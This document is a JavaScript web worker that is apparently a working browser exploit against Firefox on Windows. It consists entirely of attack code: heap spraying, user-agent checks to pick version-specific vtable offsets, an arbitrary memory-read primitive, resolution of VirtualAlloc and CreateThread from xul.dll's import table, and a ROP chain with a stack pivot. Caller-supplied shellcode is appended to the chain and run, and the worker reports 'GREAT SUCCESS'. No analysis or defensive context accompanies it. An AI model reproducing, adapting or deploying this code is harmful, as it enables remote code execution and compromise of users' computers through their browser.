self.onmessage =
function(msg) {

  thecode = msg.data;
  var pack = function (b) { var a = b >> 16; return String.fromCharCode(b
& 65535) + String.fromCharCode(a) };

  function Memory(b,a,f)
  {
      this._base_addr=b;
      this._read=a;
      this._write=f;
      this._abs_read = function(a) {
          a >= this._base_addr ? a = this._read( a - this._base_addr) : (
a = 4294967295 - this._base_addr + 1 + a, a = this._read(a) );
          return 0>a?4294967295+a+1:a

      };
      this._abs_write = function(a,b) {
          a >= this._base_addr ? this._write(a - this._base_addr, b) : ( a
= 4294967295 - this._base_addr + 1 + a, this._write(a,b) )
      };
      this.readByte = function(a) {
          return this.read(a) & 255

      };
      this.readWord = function(a) {
          return this.read(a) & 65535
      };
      this.readDword = function(a){ return this.read(a) };
      this.read = function(a,b) {
          if (a%4) {
              var c = this._abs_read( a & 4294967292),
                  d = this._abs_read( a+4 & 4294967292),
                  e = a%4;
              return c>>>8*e | d<<8*(4-e)
          }
          return this._abs_read(a)
      };
      this.readStr = function(a) {
          for(var b = "", c = 0;;) {
              if (32 == c)
                  return "";
              var d = this.readByte(a+c);
              if(0 == d)
                  break;
              b += String.fromCharCode(d);
              c++
          }
          return b

      };
      this.write = function(a){}
  }
  function PE(b,a) {
      this.mem = b;
      this.export_table = this.module_base = void 0;
      this.export_table_size = 0;
      this.import_table = void 0;
      this.import_table_size = 0;
      this.find_module_base = function(a) {
          for(a &= 4294901760; a; ) {
              if(23117 == this.mem.readWord(a))
                  return this.module_base=a;
              a -= 65536
          }
      };
      this._resolve_pe_structures = function() {
          peFile = this.module_base + this.mem.readWord(this.module_base+60);
          if(17744 != this.mem.readDword(peFile))
              throw"Bad NT Signature";
          this.pe_file = peFile;
          this.optional_header = this.pe_file+36;
          this.export_directory =
this.module_base+this.mem.readDword(this.pe_file+120);
          this.export_directory_size = this.mem.readDword(this.pe_file+124);
          this.import_directory=this.module_base+this.mem.readDword(this.pe_file+128);
          this.import_directory_size=this.mem.readDword(this.pe_file+132)};
          this.resolve_imported_function=function(a,b){
              void 0==this.import_directory&&this._resolve_pe_structures();
              for(var
e=this.import_directory,c=e+this.import_directory_size;e<c;){
                  var
d=this.mem.readStr(this.mem.readDword(e+12)+this.module_base);
                  if(a.toUpperCase()==d.toUpperCase()){
                      for(var c = this.mem.readDword(e) + this.module_base,
                              e = this.mem.readDword(e+16) +
this.module_base,
                              d = this.mem.readDword(c),
                              f = 0 ; 0 !=d ;)
                      {
                          if(this.mem.readStr(d+this.module_base+2).toUpperCase()
== b.toUpperCase())
                              return this.mem.readDword(e+4*f);
                          f++;
                          d = this.mem.readDword(c+4*f)
                      }
                      break
                  }
                  e+=20
              }
              return 0
          };
          void 0!=a && this.find_module_base(a)
      }
      function ROP(b,a){
         this.mem = b;
         this.pe = new PE(b,a);
         this.pe._resolve_pe_structures();
         this.module_base = this.pe.module_base+4096;
         this.findSequence = function(a) {
            for(var b=0;;) {
                for(var e=0,c=0;c<a.length;c++)
                    if(this.mem.readByte(this.module_base+b+c)==a[c]&&e==c)
                        e++;
                    else
                        break;
                if(e==a.length)
                    return this.module_base+b;
                b++

         }

     };
     this.findStackPivot=function() {
         return this.findSequence([148,195])

     };
     this.findPopRet=function(a) {
         return this.findSequence([88,195])

     };
     this.ropChain=function(a,b,e,c) {
         c = void 0 != c ? c : new ArrayBuffer(4096);
         c = new Uint32Array(c);
         var d = this.findStackPivot(),
             f = this.findPopRet("EAX"),
             g =
this.pe.resolve_imported_function("kernel32.dll","VirtualAlloc");
         c[0]= f+1;
         c[1]= f;
         c[2]= a+b+4*e+4;
         c[3]= d;
         for(i=0;i<e;i++)
             c[(b>>2)+i] = d;
         d =(b+4>>2)+e;
         c[d++]=g;
         c[d++]=a+(b+4*e+28);
         c[d++]=a;
         c[d++]=4096;
         c[d++]=4096;
         c[d++]=64;
         c[d++]=3435973836;
         return c
     }
  }
  var conv=new ArrayBuffer(8),
      convf64=new Float64Array(conv),
      convu32=new Uint32Array(conv),
      qword2Double=function(b,a) {
          convu32[0]=b;
          convu32[1]=a;
          return convf64[0]
      },
      doubleFromFloat = function(b,a) {
          convf64[0]=b;
          return convu32[a]

      },
      sprayArrays=function() {
          for(var b=Array(262138),a=0;262138>a;a++)
              b[a]=fzero;
          for(a=0;a<b.length;a+=512)
              b[a+1] = memory,
              b[a+21] = qword2Double(0,2),
              b[a+14] = qword2Double(arrBase+o1,0),
              b[a+(o1+8)/8] = qword2Double(arrBase+o2,0),
              b[a+(o2+0)/8] = qword2Double(2,0),
              b[a+(o2+8)/8] = qword2Double(arrBase+o3,arrBase+13),
              b[a+(o3+0)/8] = qword2Double(16,0),
              b[a+(o3+24)/8] = qword2Double(2,0),
              b[a+(o3+32)/8] = qword2Double(arrBase+o5,arrBase+o4),
              b[a+(o4+0)/8] = qword2Double(0,arrBase+o6),
              b[a+(o5+0)/8] = qword2Double(arrBase+o7,0),
              b[a+(o6+8)/8] = qword2Double(2,0),
              b[a+(o7+8)/8] = qword2Double(arrBase+o7+16,0),
              b[a+(o7+16)/8] = qword2Double(0,4026531840),
              b[a+(o7+32)/8] = qword2Double(0,3220176896),
              b[a+(o7+48)/8] = qword2Double(2,0),
              b[a+(o7+56)/8] = qword2Double(1,0),
              b[a+(o7+96)/8] = qword2Double(arrBase+o8,arrBase+o8),
              b[a+(o7+112)/8] = qword2Double(arrBase+o9,arrBase+o9+16),
              b[a+(o7+168)/8] = qword2Double(0,2),
              b[a+(o9+0)/8] = qword2Double(arrBase+o10,2),
              b[a+(o10+0)/8] = qword2Double(2,0),
              b[a+(o10+8)/8] = qword2Double(0,268435456),
              b[a+(o11+8)/8] = qword2Double(arrBase+o11+16,0),
              b[a+(o11+16)/8] = qword2Double(0,4026531840),
              b[a+(o11+32)/8] = qword2Double(0,3220176896),
              b[a+(o11+48)/8] = qword2Double(2,0),
              b[a+(o11+56)/8] = qword2Double(1,0),
              b[a+(o11+96)/8] = qword2Double(arrBase+o8,arrBase+o8),
              b[a+(o11+112)/8] = qword2Double(arrBase+o9,arrBase+o9+16),
              b[a+(o11+168)/8] = qword2Double(0,2);
          for(a=0;a<spr.length;a++)
              spr[a]=b.slice(0)
      }, vtable_offset=300;
      /.*Firefox\/(41\.0(\.[1-2]|)|42\.0).*/.test(navigator.userAgent)?
vtable_offset=304 :
      /.*Firefox\/(4[3-9]|[5-9]\d+|[1-9]\d{2,})\..*/.test(navigator.userAgent)
&& (vtable_offset=308);
      var spr=Array(400),
      arrBase=805306416,
      ropArrBuf=new ArrayBuffer(4096),
      o1=176,
      o2=256,
      o3=768,
      o4=832,
      o5=864,
      o6=928,
      o7=1024,
      o8=1280,
      o9=1344,
      o10=1376,
      o11=1536,
      oRop=1792,
      memory=new Uint32Array(16),
      len=memory.length,
      arr_index=0,
      arr_offset=0;
      fzero=qword2Double(0,0);
      0!=thecode.length%2&&(thecode+="\u9090");
      sprayArrays();
      postMessage(arrBase);
      for(memarrayloc=void 0;void 0==memarrayloc;)
          for(i=0;i<spr.length;i++)
              for(offset=0;offset<spr[i].length;offset+=512)
                 if("object" != typeof spr[i][offset+1]) {
                     memarrayloc=doubleFromFloat(spr[i][offset+1],0);
                     arr_index=i;
                     arr_offset=offset;
                     spr[i][offset+(o2+0)/8]=qword2Double(65,0);
                     spr[i][offset+(o2+8)/8]=qword2Double(arrBase+o3,memarrayloc+27);
                     for(j=0;33>j;j++)
                         spr[i][offset+(o2+16)/8+j]=qword2Double(memarrayloc+27,memarrayloc+27);
                     spr[i][offset+(o3+8)/8]=qword2Double(0,0);
                     spr[i][offset+(o5+0)/8]=qword2Double(arrBase+o11,0);
                     spr[i][offset+(o7+168)/8]=qword2Double(0,3);
                     spr[i][offset+(o7+88)/8]=qword2Double(0,2);
                     break
                 }
      for(;memory.length==len;);
      var mem=new Memory(memarrayloc+48,
                         function(b){return memory[b/4]},
                         function(b,a){memory[b/4]=a}),
          xulPtr=mem.readDword(memarrayloc+12);
      spr[arr_index][arr_offset+1]=ropArrBuf;
      ropPtr=mem.readDword(arrBase+8);
      spr[arr_index][arr_offset+1]=null;
      ropBase=mem.readDword(ropPtr+16);
      var rop=new ROP(mem,xulPtr);
      rop.ropChain(ropBase,vtable_offset,10,ropArrBuf);
      var backupESP=rop.findSequence([137,1,195]), ropChain=new
Uint32Array(ropArrBuf);
      ropChain[0]=backupESP;
      CreateThread=rop.pe.resolve_imported_function("KERNEL32.dll","CreateThread");
      for(var i=0;i<ropChain.length&&3435973836!=ropChain[i];i++);
      ropChain[i++]=3296825488;
      ropChain[i++]=2048;
      ropChain[i++]=1347469361;
      ropChain[i++]=1528949584;
      ropChain[i++]=3092271187;
      ropChain[i++]=CreateThread;
      ropChain[i++]=3096498431;
      ropChain[i++]=arrBase+16;
      ropChain[i++]=1955274891;
      ropChain[i++]=280697892;
      ropChain[i++]=704643071;
      ropChain[i++]=2425406428;
      ropChain[i++]=4294957800;
      ropChain[i++]=2425393407;
      for (var j=0;j<thecode.length;j+=2)
          ropChain[i++]=thecode.charCodeAt(j)+65536*thecode.charCodeAt(j+1);
      spr[arr_index][arr_offset]=qword2Double(arrBase+16,0);
      spr[arr_index][arr_offset+3]=qword2Double(0,256);
      spr[arr_index][arr_offset+2]=qword2Double(ropBase,0);
      spr[arr_index][arr_offset+(o11+168)/8]=qword2Double(0,3);
      spr[arr_index][arr_offset+(o11+88)/8]=qword2Double(0,2);
      postMessage("GREAT SUCCESS");
};
